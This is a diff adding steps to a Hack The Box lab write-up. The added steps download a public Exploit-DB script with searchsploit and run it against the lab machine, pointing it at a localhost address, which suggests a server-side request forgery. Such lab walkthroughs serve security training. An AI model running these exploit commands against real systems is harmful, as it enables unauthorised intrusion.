@@ -19,3 +19,17 @@ http://10.10.11.224:55555/web
 
 Search Exploits
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/133c49dc-5684-4ead-ab67-a918ada9b649)
+
+Download Exploit
+```CSS
+searchsploit -m python/webapps/51675.sh
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/22c3d009-796c-4673-b744-f4fc250d2903)
+
+Run Exploit
+```CSS
+/51675.sh http://10.10.11.224:55555/ http://127.0.0.1:80/
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/21037b3a-2ebd-4701-97e3-716eab11b387)
+
+```
